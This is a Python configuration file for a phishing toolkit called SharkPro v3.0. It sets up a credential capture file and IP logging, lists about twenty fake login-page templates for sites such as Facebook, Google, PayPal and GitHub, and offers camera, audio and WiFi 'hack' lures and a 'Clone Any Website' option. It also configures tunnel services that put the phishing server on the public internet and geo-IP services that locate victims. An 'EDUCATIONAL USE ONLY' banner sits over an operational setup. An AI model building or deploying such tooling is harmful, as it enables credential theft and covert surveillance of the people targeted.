#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - Configuration
Central configuration for all modules
"""

import os
from colorama import Fore, Style, init

# Initialize colors
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
NC = Style.RESET_ALL

# Server Configuration
PORT = 8080
SERVER_HOST = "0.0.0.0"
SERVER_DIR = ".shark_server"

# File Paths
CREDS_FILE = "captured_credentials.txt"
IP_LOG_FILE = "ip_logs.txt"
SESSION_FILE = "session_data.json"

# Directories
TEMPLATES_DIR = "templates"
STATIC_DIR = "static"
CAPTURES_DIR = "captures"

# Banner
BANNER = f"""
{C}╔══════════════════════════════════════════════════════════════════╗{NC}
{C}║{G}   ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗██████╗ ██████╗ ██████╗ {C}║{NC}
{C}║{G}   ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝╚═══██╗╚═══██╗ ██╔══██╗{C}║{NC}
{C}║{G}   ███████╗███████║███████║██████╔╝█████╔╝   ██╔╝   ██╔╝ ██████╔╝{C}║{NC}
{C}║{G}   ╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗  ██╔╝   ██╔╝  ██╔═══╝  {C}║{NC}
{C}║{G}   ███████║██║  ██║██║  ██║██║  ██║██║  ██╗███████╗██║   ██║      {C}║{NC}
{C}║{G}   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝      {C}║{NC}
{C}║{NC}                                                                     {C}║{NC}
{C}║{Y}                    ⚠️  EDUCATIONAL USE ONLY  ⚠️                  {C}║{NC}
{C}║{Y}                     v3.0 - 2026 Edition                             {C}║{NC}
{C}╚══════════════════════════════════════════════════════════════════╝{NC}
"""

# Templates configuration - Only requested ones
TEMPLATES = {
    "01": {"name": "Facebook", "redirect": "https://facebook.com/login", 
           "file": "facebook.html", "type": "social", "desc": "Facebook Login"},
    "02": {"name": "Instagram", "redirect": "https://instagram.com/accounts/login",
           "file": "instagram.html", "type": "social", "desc": "Instagram Login"},
    "03": {"name": "Google", "redirect": "https://accounts.google.com",
           "file": "google.html", "type": "social", "desc": "Google Sign-In"},
    "04": {"name": "PayPal", "redirect": "https://paypal.com/signin",
           "file": "paypal.html", "type": "payment", "desc": "PayPal Login"},
    "05": {"name": "Netflix", "redirect": "https://netflix.com/login",
           "file": "netflix.html", "type": "entertainment", "desc": "Netflix Sign In"},
    "06": {"name": "Insta Followers", "redirect": "https://instagram.com",
           "file": "instagram_followers.html", "type": "social", "desc": "Free Followers 2026"},
    "07": {"name": "WhatsApp", "redirect": "https://web.whatsapp.com",
           "file": "whatsapp.html", "type": "social", "desc": "WhatsApp Web"},
    "08": {"name": "LinkedIn", "redirect": "https://linkedin.com/login",
           "file": "linkedin.html", "type": "social", "desc": "LinkedIn Login"},
    "09": {"name": "Hotstar", "redirect": "https://hotstar.com/in",
           "file": "hotstar.html", "type": "entertainment", "desc": "Disney+ Hotstar"},
    "10": {"name": "Spotify", "redirect": "https://accounts.spotify.com",
           "file": "spotify.html", "type": "entertainment", "desc": "Spotify Login"},
    "11": {"name": "GitHub", "redirect": "https://github.com/login",
           "file": "github.html", "type": "developer", "desc": "GitHub Sign In"},
    "12": {"name": "IP Finder", "redirect": "https://whatismyipaddress.com",
           "file": "ip_tracker.html", "type": "service", "desc": "Track IP Location"},
    "13": {"name": "Telegram", "redirect": "https://web.telegram.org",
           "file": "telegram.html", "type": "social", "desc": "Telegram Web"},
    "14": {"name": "X/Twitter", "redirect": "https://twitter.com/i/flow/login",
           "file": "x.html", "type": "social", "desc": "X Login"},
    "15": {"name": "Snapchat", "redirect": "https://accounts.snapchat.com",
           "file": "snapchat.html", "type": "social", "desc": "Snapchat Login"},
    "16": {"name": "Camera Hack", "redirect": "https://google.com",
           "file": "camera_verify.html", "type": "advanced", "desc": "Camera Verification"},
    "17": {"name": "Audio Hack", "redirect": "https://google.com",
           "file": "audio_verify.html", "type": "advanced", "desc": "Voice Verification"},
    "18": {"name": "WiFi Hack", "redirect": "https://google.com",
           "file": "wifi_connect.html", "type": "advanced", "desc": "Free WiFi Access"},
    "19": {"name": "Discord", "redirect": "https://discord.com/login",
           "file": "discord.html", "type": "social", "desc": "Discord Login"},
    "20": {"name": "Steam", "redirect": "https://store.steampowered.com/login",
           "file": "steam.html", "type": "gaming", "desc": "Steam Login"},
    "99": {"name": "Custom Clone", "redirect": "",
           "file": "custom.html", "type": "custom", "desc": "Clone Any Website"},
}

# Tunnel services config
TUNNEL_SERVICES = {
    "ngrok": {
        "name": "Ngrok",
        "command": ["ngrok", "http", "{port}", "--log=stdout"],
        "api_url": "http://127.0.0.1:4040/api/tunnels",
        "warning": "Google may block this URL",
        "install_cmd": {
            "linux": "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo 'deb https://ngrok-agent.s3.amazonaws.com buster main' | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok",
            "termux": "pkg install ngrok -y",
        }
    },
    "cloudflared": {
        "name": "Cloudflared",
        "command": ["cloudflared", "tunnel", "--url", "http://localhost:{port}"],
        "pattern": r"https://[a-zA-Z0-9-]+\.trycloudflare\.com",
        "install_cmd": {
            "linux": "curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && sudo dpkg -i cloudflared.deb",
            "termux": "pkg install cloudflared -y",
        }
    },
    "localhost-run": {
        "name": "Localhost.run",
        "command": ["ssh", "-R", "80:localhost:{port}", "localhost.run"],
        "pattern": r"[a-zA-Z0-9-]+\.lhrtunnel\.link",
        "install_cmd": {},
        "note": "Requires SSH key setup"
    },
    "localtunnel": {
        "name": "Localtunnel",
        "command": ["npx", "lt", "--port", "{port}"],
        "pattern": r"https://[a-zA-Z0-9-]+\.loca\.lt",
        "install_cmd": {
            "all": "npm install -g localtunnel"
        }
    },
    "localhost": {
        "name": "Localhost",
        "command": None,
        "url": "http://localhost:{port}",
        "note": "Local testing only"
    }
}

# GeoIP services (multiple for redundancy)
GEO_SERVICES = [
    "http://ip-api.com/json/{ip}",
    "https://ipapi.co/{ip}/json/",
    "https://ipwho.is/{ip}",
]

# Ensure directories exist
def setup_dirs():
    """Create necessary directories"""
    for dir_path in [SERVER_DIR, CAPTURES_DIR, STATIC_DIR,
                     os.path.join(STATIC_DIR, "css"),
                     os.path.join(STATIC_DIR, "js"),
                     os.path.join(STATIC_DIR, "img")]:
        os.makedirs(dir_path, exist_ok=True)

if __name__ == "__main__":
    setup_dirs()
    print(f"{G}[✓] Directories initialized{NC}")
    
def setup_dirs():
    dirs = [
        SERVER_DIR,
        TEMPLATES_DIR,
        STATIC_DIR,
        CAPTURES_DIR
    ]

    for d in dirs:
        os.makedirs(d, exist_ok=True)